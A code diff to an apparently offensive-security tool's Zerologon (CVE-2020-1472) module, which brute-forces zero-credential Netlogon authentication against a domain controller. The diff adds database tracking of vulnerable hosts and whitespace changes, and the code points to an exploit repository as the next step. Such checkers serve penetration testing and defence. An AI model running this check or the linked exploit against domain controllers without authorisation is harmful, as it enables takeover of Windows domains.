@@ -16,6 +16,7 @@ from subprocess import check_call
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
 
+
 class CMEModule:
 
     name = 'zerologon'
@@ -33,11 +34,15 @@ class CMEModule:
         if perform_attack('\\\\' + connection.hostname, connection.host, connection.hostname):
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
+            host = context.db.get_computers(connection.host)[0]
+            context.db.add_computer(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)
+
 
 def fail(msg):
     logging.debug(msg, file=sys.stderr)
     logging.debug('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
     sys.exit(2)
+
 
 def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     # Connect to the DC's Netlogon service.
@@ -72,6 +77,7 @@ def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     except BaseException as ex:
         fail(f'Unexpected error: {ex}.')
 
+
 def perform_attack(dc_handle, dc_ip, target_computer):
     # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
     logging.debug('Performing authentication attempts...')
@@ -91,5 +97,3 @@ def perform_attack(dc_handle, dc_ip, target_computer):
         return True
     else:
         logging.debug('\nAttack failed. Target is probably patched.')
-
-
